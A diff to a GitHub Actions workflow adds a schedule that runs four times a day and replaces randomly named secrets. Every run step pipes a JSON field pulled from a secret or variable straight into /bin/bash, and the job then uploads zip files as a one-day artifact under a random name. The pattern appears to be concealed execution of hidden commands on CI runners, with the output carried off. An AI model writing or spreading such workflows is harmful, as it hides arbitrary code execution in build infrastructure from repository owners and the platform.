@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '53 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,18 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          gi85687: ${{ secrets.gi85687 }}
+          h44232: ${{ secrets.h44232 }}
         run: |
-          printf '%s' "$gi85687" | jq -r .z8 | /bin/bash
-          printf '%s' "$zivh46669" | jq -r .kfhjh939 | /bin/bash
-          printf '%s' "$tle35" | jq -r .kmsvj64108 | /bin/bash
-          printf '%s' "$lcl1986" | jq -r .il4 | /bin/bash
-          printf '%s' "$zgop734" | jq -r .tnmh7493 | /bin/bash
-          echo $l2 | jq -r .rag26011 | /bin/bash
+          printf '%s' "$h44232" | jq -r .gskbx13449 | /bin/bash
+          echo $tbeio78 | jq -r .vjys1 | /bin/bash
+          echo $rtm60812 | jq -r .siomo909 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: GpagDamk
+          name: 43TFIrNc
           path: "*.zip"
           retention-days: 1
